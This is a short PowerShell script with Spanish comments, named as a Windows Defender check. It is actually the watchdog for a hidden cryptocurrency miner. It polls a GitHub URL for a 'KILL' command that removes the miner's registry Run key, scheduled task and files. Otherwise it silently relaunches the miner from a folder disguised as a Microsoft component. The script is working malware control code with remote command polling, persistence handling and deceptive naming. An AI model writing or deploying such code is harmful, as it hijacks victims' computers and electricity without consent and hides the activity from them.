# win_defender_check.ps1 - Sistema de vigilancia remota
$url = "https://raw.githubusercontent.com/methmouth/duco-multi-miner/main/status.txt"
$dir = "C:\ProgramData\Microsoft\NetworkModules"

try {
    # 1. Consulta el estado en GitHub
    $status = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content.Trim()

    if ($status -eq "KILL") {
        # --- PROTOCOLO DE AUTODESTRUCCIÓN ---
        # Detener el minero
        Stop-Process -Name "WinNetHost" -Force -ErrorAction SilentlyContinue
        
        # Eliminar persistencia del registro de Windows
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NetHostUpdate" -ErrorAction SilentlyContinue
        
        # Eliminar la tarea programada de vigilancia
        Unregister-ScheduledTask -TaskName "WinNetDiagnostics" -Confirm:$false -ErrorAction SilentlyContinue
        
        # Borrar toda la carpeta de archivos
        Remove-Item -Path $dir -Recurse -Force
    } 
    else {
        # --- PROTOCOLO DE MANTENIMIENTO ---
        # Si por alguna razón el minero no está corriendo, lo reinicia
        $process = Get-Process -Name "WinNetHost" -ErrorAction SilentlyContinue
        if (!$process) {
            Start-Process -FilePath "$dir\WinNetHost.exe" -ArgumentList "--config=$dir\config.json" -WindowStyle Hidden
        }
    }
} catch {
    # Si no hay internet, el script no hace nada y espera a la próxima ejecución
}
